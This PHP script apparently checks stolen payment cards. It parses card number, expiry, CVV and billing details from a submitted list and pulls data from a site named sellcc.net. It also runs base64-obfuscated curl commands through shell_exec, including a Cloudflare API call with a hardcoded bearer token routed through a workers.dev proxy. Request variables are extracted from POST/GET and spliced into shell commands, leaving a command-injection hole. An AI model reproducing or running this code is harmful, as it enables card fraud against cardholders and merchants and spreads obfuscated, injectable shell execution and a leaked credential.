<?php
error_reporting(1);

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function inStr($responsis,$as){
	$responsis=strtoupper($responsis);
	if(!is_array($as)) $as=array($as);
	for($i=0;$i<count($as);$i++) if(strpos(($responsis),strtoupper($as[$i]))!==false) return true;
	return false;
}

$cookieFile = tempnam ("./temp", "CURLCOOKIE");

$fp = fopen($cookieFile,'wb') or die("can't open cookie file");
fclose($fp);



    include "vendor/autoload.php";

    $faker = Faker\Factory::create();
    
    $fakedName = $faker->name;
    $fakedFirstName = $faker->firstName;
    $fakedLastName = $faker->lastName;
    $fakedEmail = $faker->email;
    $fakedIp = $faker->ipv4;
    $fakeduuid = $faker->uuid;
    $fakeduuids = $faker->uuid;
    $fakeduuiid = $faker->uuid;
    $fakedzip = $faker->postcode;
    $fakedstreetAddress = $faker->streetAddress;
    $fakedcity = $faker->city;
    $fakedstateAbbr = $faker->stateAbbr;
    $fakedaddress = $faker->address;
    $fakeduserAgent = $faker->userAgent;
    $fakedpassword = $faker->password;
    $ones_digit_random_number = mt_rand(100000, 399999);
    $six_digit_random_number = mt_rand(100000, 999999);
    $ford_digit_random_number = mt_rand(1000, 9999);
    $four_digit_random_number = mt_rand(1000, 9999);
    $five_digit_random_number = mt_rand(10000, 99999);
    $randomID_number = mt_rand(5000000, 5999999);
    $then_digit_random_number = mt_rand(1000000000, 9999999999);
	$then_digit_random_numbers = mt_rand(100000000000, 999999999999);
    $three_digit_random_number = mt_rand(100, 999);
    $tow_digit_random_number = mt_rand(10, 99);
    $one_digit_random_number = mt_rand(1, 10);
    $random_amount = mt_rand(20, 25);
	$ones_digit = mt_rand(1, 100);
	$ones_digits = "$ones_digit";

function rebootproxys() {
        $poxySocks = array(
                           );
        $myproxy = $poxySocks[rand ( 0 , count($poxySocks) -1)];
        
        return $myproxy;
    }
    $User_Agent = rebootproxys();


function rebootTitle() {
    $Title = array(
'8066827700',
'8087807076',
'8082828488',
'8076877378',
'8084828385',
'8072788279',
'8066826965',
	);
    $myTitle = $Title[rand ( 0 , count($Title) -1)];

    return $myTitle;
}
    $ids = rebootTitle();  

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}


$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$ccname = $separa[4];
$ccaddress = $separa[5];
$cccity = $separa[6];
$states = $separa[7];
$zipco = $separa[8];

$ccyy = substr("$ano", -2, 2);
$ccmes = $mes;
$ccmm = sprintf("%02d", $ccmes);
$var = $ccmm;
$ccmms = $var*1; 

/*
    $cctype = 'VISA';
    $cv2 = $three_digit_random_number;
    $arrayccNum = $cc;
    $ccn2type = $arrayccNum[0];
    $isAmexCard = $isvisa;
    switch ($ccn2type) {
        case 3:
            $cctype = 'AMEX';
            $pattternCCToken = '/(\d{4})(\d{6})(\d{5})/i';
            $replaceCCToken = '$1+$2+$3+';
            $cv2 = $four_digit_random_number;
            $isAmexCard = substr("$cc", 11, 4);
            break;
        case 4:
            $cctype = 'VISA';
            $pattternCCToken = '/(\d{4})(\d{4})(\d{4})(\d{4})/i';
            $replaceCCToken = '$1+$2+$3+$4';
            $cv2 = $three_digit_random_number;
            $isvisa = substr("$cc", 12, 4);
            break;
        case 5:
            $cctype = 'MC';
            $pattternCCToken = '/(\d{4})(\d{4})(\d{4})(\d{4})/i';
            $replaceCCToken = '$1+$2+$3+$4';
            $cv2 = $three_digit_random_number;
            $ismastercard = substr("$cc", 12, 4);
            break;
        case 6:
            $cctype = 'DISCOVER';
            $pattternCCToken = '/(\d{4})(\d{4})(\d{4})(\d{4})/i';
            $replaceCCToken = '$1+$2+$3+$4';
            $cv2 = $three_digit_random_number;
            $isdiscover = substr("$cc", 12, 4);
            break;
    }

*/

$cctype = 'VISA';
$arrayccNum = $cc;
$ccn2type = $arrayccNum[0];
$isAmexCard = $isvisa;
switch ($ccn2type) {
    case 3:
        $cctype = 'AMEX';
        $pattternCCToken = '/(\d{4})(\d{6})(\d{5})/i';
        $replaceCCToken = '$1+$2+$3+';
        //$isAmexCard = 'true';
        $isAmexCard = substr("$cc", 11, 4);
        break;
    case 4:
        $cctype = 'VISA';
        $pattternCCToken = '/(\d{4})(\d{4})(\d{4})(\d{4})/i';
        $replaceCCToken = '$1+$2+$3+$4';
        //$isvisa = 'true';
        $isvisa = substr("$cc", 12, 4);
        break;
    case 5:
        $cctype = 'MC';
        $pattternCCToken = '/(\d{4})(\d{4})(\d{4})(\d{4})/i';
        $replaceCCToken = '$1+$2+$3+$4';
        //$ismastercard = 'true';
        $ismastercard = substr("$cc", 12, 4);
        break;
    case 6:
        $cctype = 'DISC';
        $pattternCCToken = '/(\d{4})(\d{4})(\d{4})(\d{4})/i';
        $replaceCCToken = '$1+$2+$3+$4';
        //$isdiscover = 'true';
        $isdiscover = substr("$cc", 12, 4);
        break;
}


	 // header('Content-Type: text/html, charset=utf-8');
  header('Content-Type: text/plain; charset=utf-8');
//$html = file_get_contents("https://sellcc.net/bigdumsp.php");
//echo $html;
// 1. initialize cURL
$ch = curl_init();
// 2. set the URL to access
$url = "https://sellcc.net/bigdumsp.php";
curl_setopt($ch, CURLOPT_URL, $url);
// 3. set cURL to return as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// 4. execute cURL and store the result
$UserAgents = curl_exec($ch);
// 5. close cURL after use
//echo $User_Agent;
//$User_Agent = str_replace('\r', ' ', $User_Agent);
$UserAgents = preg_replace('/\r\n/', '', $UserAgents);

//echo $User_Agent;
//echo $User_Agent;

curl_close($ch);

$datasave = base64_decode("Y3VybCAtTCA=");
$datasave .= base64_decode("J2h0dHBzOi8vcmVjaGVja2VyLm5ldC93d3cvdGVzdC5waHA=");
$datasave .= base64_decode("JyBcCiAgLUggJ0FjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45JyBcCiAgLUggJ0FjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW4nIFwKICAtSCAnQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wJyBcCiAgLUggJ0Nvbm5lY3Rpb246IGtlZXAtYWxpdmUnIFwKICAtSCAnU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50JyBcCiAgLUggJ1NlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZScgXAogIC1IICdTZWMtRmV0Y2gtU2l0ZTogbm9uZScgXAogIC1IICdTZWMtRmV0Y2gtVXNlcjogPzEnIFwKICAtSCAnVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMScgXAogIC1IICdVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNF82KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA0LjAuNTA3OC4wIFNhZmFyaS81MzcuMzYnIFwKICAtSCAnc2VjLWNoLXVhOiAiQ2hyb21pdW0iO3Y9IjEwNCIsICIvTm90KUE7QnJhbmQiO3Y9IjI0IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEwNCInIFwKICAtSCAnc2VjLWNoLXVhLW1vYmlsZTogPzAnIFwKICAtSCAnc2VjLWNoLXVhLXBsYXRmb3JtOiAibWFjT1MiJyBcCiAgLUggJ0Nvbm5lY3Rpb246IGNsb3NlJyBcCiAgLS1jb21wcmVzc2Vk");
    $datasave .= $data.base64_decode("IC1r");
     
     $result = shell_exec($datasave);
//echo $result."\n";
$location = json_decode(trim(strip_tags($result)), true);
$FirstName = $location['results']['0']['FirstName'];
$LastName = $location['results']['0']['LastName'];
$Email = $location['results']['0']['Email'];
$Address = $location['results']['0']['Address'];
$City = $location['results']['0']['City'];
$State = $location['results']['0']['State'];
$Statecode = strtolower($State);
$Postal = $location['results']['0']['Postal'];
//$User_Agent = $location['results']['0']['User_Agent'];
$Name = $location['results']['0']['Name'];
$prosock5h = $location['results']['0']['Proxy'];
//echo $cctype."\n";
$Phone = "310$three_digit_random_number$four_digit_random_number";
$UserAgents = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:102.0) Gecko/30100101 Firefox/102.0";

//if (inStr($cctype, 'VISA')||inStr($cctype, 'MASTER_CARD')) {
//if (inStr($cctype, 'dacac')||inStr($cctype, 'dacac')) {
$ids = "KwYQSzTYM8mQcB2MEP3JXrspQB-nri5uM_xNaGnP";

if (isset($ids)) {
$datapost = "";
$datasave = base64_decode("Y3VybCAtLXJlcXVlc3QgUE9TVCBcCiAtLXVybCBodHRwczovL2FwaS5jbG91ZGZsYXJlLmNvbS9jbGllbnQvdjQvYWNjb3VudHMvNzkyYzJmZDdlOTc3YWM1MTkyZWE0NDRlZDlhOTY4MTYvaW1hZ2VzL3YxIFwKIC0taGVhZGVyICdBdXRob3JpemF0aW9uOiBCZWFyZXIg");
$datasave .= $ids.base64_decode("JyBcCiAtLWZvcm0gJ3VybD1odHRwczovL3dvcmtlci1yYXBpZC1idXR0ZXJmbHktM2YzYS54ZW1pbmluZy53b3JrZXJzLmRldi8/dXJsPQ==");
$datasave .= $datapost.base64_decode("JyBcCiAtLWZvcm0gJ21ldGFkYXRhPXsia2V5IjoidmFsdWUifScgXAogLS1mb3JtICdyZXF1aXJlU2lnbmVkVVJMcz1mYWxzZSc=");
//$datasave .= base64_decode("IiwKICAgICJ1c2VyLWFnZW50IjogIg==");
//$datasave .= $UserAgents.base64_decode("IgogIH0KfSc=");
//echo $datasave."\n";
$result = shell_exec($datasave);
//echo $result."\n";
	
$__redirectcurl = trim(strip_tags(getStr($result, 'form name=\"form-sign-up\" method=\"post\" action=\"','\">')));
$set_local = str_replace('&amp;', '&', $__redirectcurl);
$location = json_decode(trim(strip_tags($result)), true);
$set_cookiexa = $location['solution']['headers']['set-cookie'];
//echo $set_local."\n";

$set_cookies = $set_cookiexa;
//$set_cookiexa = str_replace('\n', '; ', $set_cookiexa);
//print_r($set_cookiexa);
//$x_relay_url = preg_replace('/\r\n/m', '; ', $str);
//echo $set_cookiexa."\n";
$set_cookiesxa = preg_replace('/\n/m', '; ', $set_cookies);
//echo $set_cookiexa;
//print($set_local);
//echo $set_cookiexa."\n";

  $re_9_9 = '/^Set-Cookie:\s*([^;]*)/mi';
        preg_match_all($re_9_9, $result, $matches_9_9, PREG_SET_ORDER, 0);
        //print_r($matches_9_9);
        $set_cookie0 = $matches_9_9[0][1];
        $set_cookie1 = $matches_9_9[1][1];
        $set_cookie2 = $matches_9_9[2][1];
        $set_cookie3 = $matches_9_9[3][1];
        $set_cookie4 = $matches_9_9[4][1];
        $set_cookie5 = $matches_9_9[5][1];
        $set_cookie6 = $matches_9_9[6][1];
        $set_cookie7 = $matches_9_9[7][1];
        $set_cookie8 = $matches_9_9[8][1];
        $set_cookie9 = $matches_9_9[9][1];
        $set_cookie10 = $matches_9_9[10][1];
        $set_cookie11 = $matches_9_9[11][1];
        $set_cookie12 = $matches_9_9[12][1];
        $set_cookie13 = $matches_9_9[13][1];
        $set_cookie14 = $matches_9_9[14][1];
        $set_cookie15 = $matches_9_9[15][1];
        $set_cookie16 = $matches_9_9[16][1];
        $set_cookie17 = $matches_9_9[17][1];
        $set_cookie18 = $matches_9_9[18][1];
        $set_cookie19 = $matches_9_9[19][1];
	 	$cookie001 = "$set_cookie0; $set_cookie1";
	}